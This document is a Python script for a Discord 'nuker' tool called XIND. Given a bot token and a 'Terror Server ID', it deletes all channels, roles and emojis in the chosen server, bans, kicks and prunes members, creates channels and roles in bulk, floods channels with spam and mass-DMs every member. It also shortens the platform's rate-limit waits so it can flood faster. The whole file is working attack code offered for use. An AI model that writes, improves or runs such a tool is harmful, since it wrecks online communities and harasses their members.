import asyncio
import os
import httpx
import discord
from discord.ext import commands
from termcolor import colored

# ANSI color code setup
os.system('color')
os.system('title XIND')

red = '\33[31m'
green = '\33[32m'
yellow = '\33[33m'
blue = '\33[34m'
cyan = '\33[36m'

BASE_URL = "https://discord.com/api/v10"
HEADERS = {}

# Default send rate (initial value)
rate_delay = 0.3

def print_rainbow_text(text):
    colors = [red, yellow, green, cyan, blue]
    for line in text.splitlines():
        for i, char in enumerate(line):
            color = colors[i % len(colors)]
            print(colored(char, color), end="")
        print()  # line break

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii_art():
    ascii_art = """ 
 __   __      ______      __  __      ____      
/\ \ /\ \    /\__  _\    /\ \/\ \    /\  _\    
\ \\/'/'   \/_/\ \/    \ \ \\ \   \ \ \/\ \  
 \/ > <        \ \ \     \ \ ,  \   \ \ \ \ 
    \/'/\\      \_\ \__   \ \ \\ \   \ \ \_\ \
    /\_\\ \_\    /\_____\   \ \_\ \_\   \ \____/
    \ _/ \/_/    \/_____/    \/_/\/_/    \/___/
    """
    print(blue + ascii_art)

def display_menu():
    print_ascii_art()
    menu = f"""
              {green}╚╦╗                                                             ╔╦╝
        {green} ╔═════╩══════════════════╦═════════════════════════╦══════════════════╩═════╗
        {green} ╩ {red}(1) < Ban Members      {green}║ {yellow}(5) < Create Roles      {green}║ {yellow}(9)  < Spam Channels   
        {green}   {red}(2) < Kick Members     {green}║ {red}(6) < Delete Channels   {green}║ {yellow}(10) < Rate delay change
        {green}   {red}(3) < Prune Members    {green}║ {red}(7) < Delete Roles      {green}║ {yellow}(11) < DM Send
        {green} ╦ {yellow}(4) < Create Channels  {green}║ {red}(8) < Delete Emojis     {green}║ {cyan}(12) < Quit
        {green} ╚═════╦══════════════════╩═════════════════════════╩══════════════════╦═════╝
        {green}      ╔╩╝                                                             ╚╩╗
    """ # 코드로보면 어지럽게 보이지만 출력될때는 정상이니까 냅두는게 좋다.
    print(menu)

async def send_request(client, method, url, json=None):
    response = await client.request(method, url, headers=HEADERS, json=json)
    response.raise_for_status()
    return response.json()

async def rate_limited_send(client, method, url, json=None):
    while True:
        try:
            return await send_request(client, method, url, json)
        except httpx.HTTPStatusError as exc:
            if exc.response.status_code == 429:  # HTTP 429 Too Many Requests
                retry_after = float(exc.response.headers.get('Retry-After', '1'))  # Ensure retry_after is float
                retry_after = min(retry_after, rate_delay)  # Adjust retry_after based on rate_delay
                print(f"Rate limit exceeded. Retrying after {retry_after} seconds.")
                await asyncio.sleep(retry_after)
            else:
                raise

async def ban_members(client, guild_id):
    member_id = int(input(red + "Enter the member ID to ban: "))
    url = f"{BASE_URL}/guilds/{guild_id}/bans/{member_id}"
    try:
        await rate_limited_send(client, "PUT", url, json={"reason": "Banned for violating rules"})
        print(f"Member {member_id} has been banned for 'violating rules'.")
    except Exception as e:
        print(f"Failed to ban member {member_id}: {e}")

async def kick_members(client, guild_id):
    member_id = int(input(red + "Enter the member ID to kick: "))
    url = f"{BASE_URL}/guilds/{guild_id}/members/{member_id}"
    try:
        await rate_limited_send(client, "DELETE", url, json={"reason": "Kicked for violating rules"})
        print(f"Member {member_id} has been kicked.")
    except Exception as e:
        print(f"Failed to kick member {member_id}: {e}")

async def prune_members(client, guild_id):
    days = int(input("Enter the number of days: "))
    url = f"{BASE_URL}/guilds/{guild_id}/prune"
    try:
        response = await rate_limited_send(client, "POST", url, json={"days": days})
        count = response.get("pruned", 0)
        print(f"{count} members have been pruned.")
    except Exception as e:
        print(f"Failed to prune members: {e}")

async def create_channels(client, guild_id):
    channel_name = input(red + "Enter the channel name: ")
    count = int(input(red + "Enter the number of channels to create: "))
    url = f"{BASE_URL}/guilds/{guild_id}/channels"
    tasks = []
    for i in range(count):
        task = asyncio.create_task(rate_limited_send(client, "POST", url, json={"name": f"{channel_name}-{i}", "type": 0}))
        tasks.append(task)
    await asyncio.gather(*tasks)
    print(green + f"Created {count} channels.")

async def create_roles(client, guild_id):
    role_name = input(red + "Enter the role name: ")
    count = int(input(red + "Enter the number of roles to create: "))
    url = f"{BASE_URL}/guilds/{guild_id}/roles"
    tasks = []
    for i in range(count):
        task = asyncio.create_task(rate_limited_send(client, "POST", url, json={"name": f"{role_name}-{i}"}))
        tasks.append(task)
    await asyncio.gather(*tasks)
    print(green + f"Created {count} roles.")

async def delete_channels(client, guild_id):
    url = f"{BASE_URL}/guilds/{guild_id}/channels"
    try:
        channels = await rate_limited_send(client, "GET", url)
        tasks = []
        for channel in channels:
            channel_id = channel.get("id")
            if channel_id:
                task = asyncio.create_task(rate_limited_send(client, "DELETE", f"{BASE_URL}/channels/{channel_id}"))
                tasks.append(task)
        await asyncio.gather(*tasks)
        print(green + "Deleted all channels.")
    except Exception as e:
        print(red + f"Failed to delete channels: {e}")

async def delete_roles(client, guild_id):
    try:
        guild = client.get_guild(guild_id)
        roles = await guild.fetch_roles()
        tasks = []
        for role in roles:
            if role.name != "@everyone" and role.permissions.manage_roles:
                try:
                    task = asyncio.create_task(role.delete())
                    tasks.append(task)
                except discord.Forbidden:
                    print(red + f"Failed to delete role {role.name}: Insufficient permissions")
        await asyncio.gather(*tasks)
        print(green + "Deleted all roles.")
    except Exception as e:
        print(red + f"Failed to delete roles: {e}")

async def delete_emojis(client, guild_id):
    url = f"{BASE_URL}/guilds/{guild_id}/emojis"
    try:
        emojis = await rate_limited_send(client, "GET", url)
        tasks = []
        for emoji in emojis:
            emoji_id = emoji.get("id")
            if emoji_id:
                task = asyncio.create_task(rate_limited_send(client, "DELETE", f"{BASE_URL}/guilds/{guild_id}/emojis/{emoji_id}"))
                tasks.append(task)
        await asyncio.gather(*tasks)
        print(green + "Deleted all emojis.")
    except Exception as e:
        print(red + f"Failed to delete emojis: {e}")

async def spam_channels(client, guild_id):
    channel_input = input(red + "Enter the channel ID to spam (type 'all' for all channels): ")
    message = input(red + "Enter the message to spam: ")
    count = int(input(red + "Enter the number of messages to send: "))
    
    channels = []
    if channel_input.lower() == "all":
        url = f"{BASE_URL}/guilds/{guild_id}/channels"
        channels_response = await rate_limited_send(client, "GET", url)
        channels = [channel.get("id") for channel in channels_response if channel.get("type") == 0]
    else:
        channels = [int(channel_input)]

    async def send_message_batch(ch_id, message, count):
        tasks = [
            asyncio.create_task(rate_limited_send(client, "POST", f"{BASE_URL}/channels/{ch_id}/messages", json={"content": message}))
            for _ in range(count)
        ]
        await asyncio.gather(*tasks)

    tasks = []
    for channel_id in channels:
        tasks.append(asyncio.create_task(send_message_batch(channel_id, message, count)))
    await asyncio.gather(*tasks)
    print(green + f"Sent {count} messages to all channels.")

async def dm_send(client, guild_id):
    recipient_input = input(red + "Enter the user ID to send DM (type 'all' for all members): ")
    message = input(red + "Enter the message to send: ")
    count = int(input(red + "Enter the number of DMs to send: "))

    recipient_ids = []
    if recipient_input.lower() == "all":
        url = f"{BASE_URL}/guilds/{guild_id}/members"
        members_response = await rate_limited_send(client, "GET", url)
        recipient_ids = [member['user']['id'] for member in members_response]
    else:
        recipient_ids = [int(recipient_input)]

    async def send_dm(user_id, message, count):
        dm_channel_url = f"{BASE_URL}/users/@me/channels"
        dm_channel_response = await rate_limited_send(client, "POST", dm_channel_url, json={"recipient_id": user_id})
        channel_id = dm_channel_response.get('id')

        tasks = [
            asyncio.create_task(rate_limited_send(client, "POST", f"{BASE_URL}/channels/{channel_id}/messages", json={"content": message}))
            for _ in range(count)
        ]
        await asyncio.gather(*tasks)

    tasks = []
    for user_id in recipient_ids:
        tasks.append(asyncio.create_task(send_dm(user_id, message, count)))
    await asyncio.gather(*tasks)
    print(green + f"Sent {count} DMs.")

def change_rate_delay():
    global rate_delay
    try:
        new_delay = float(input(green + " change delay time (in seconds): "))
        rate_delay = new_delay
        print(green + f"Request delay time updated to {rate_delay} seconds.")
    except ValueError:
        print(red + "Invalid input. Please enter a valid number.")

def exit_program():
    print(red + "Quit...")
    os.system('exit')

async def run_option(option, client, guild_id): # 옵션에 알맞은 기능 제공 함수
    clear_console()
    if option == "1":
        await ban_members(client, guild_id)
    elif option == "2":
        await kick_members(client, guild_id)
    elif option == "3":
        await prune_members(client, guild_id)
    elif option == "4":
        await create_channels(client, guild_id)
    elif option == "5":
        await create_roles(client, guild_id)
    elif option == "6":
        await delete_channels(client, guild_id)
    elif option == "7":
        await delete_roles(client, guild_id)
    elif option == "8":
        await delete_emojis(client, guild_id)
    elif option == "9":
        await spam_channels(client, guild_id)
    elif option == "10":
        change_rate_delay()
    elif option == "11":
        async with httpx.AsyncClient() as http_client:
            await dm_send(http_client, guild_id)
    elif option =="12":
        exit_program()
    else:
        print(red + "Invalid option. Please try again.")

client = commands.Bot(command_prefix="*", intents=discord.Intents.all())

@client.event
async def on_ready(): #봇이 켜지고난후 채널선택 함수
    os.system('title XIND Channel Selection')
    print(green + f"Logged in as {client.user}")
    print(red + "--------------------------------------")

    for guild in client.guilds:
        print(blue + f"{guild.id}: {guild.name}")
    
    guild_id = int(input(red + "Terror Server ID: "))

    async with httpx.AsyncClient() as http_client:
        if guild_id in [guild.id for guild in client.guilds]:
            while True:
                os.system(f'title XIND Menu (Selected Server: {guild_id})')
                clear_console()
                display_menu()
                choice = input(red + "Select an option: ")
                await run_option(choice, http_client, guild_id)
                input(green + "Press Enter to return to the menu...")
        else:
            print(red + "Could not find the server.")

async def main():
    clear_console()
    print_ascii_art()
    os.system('title XIND LOGIN')
    print(red + "Bots must have all intents turned on")
    tokenic = input(red + "bot token: ")
    
    global HEADERS
    HEADERS = {"Authorization": f"Bot {tokenic}"} # 헤더 설정

    await client.start(tokenic)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
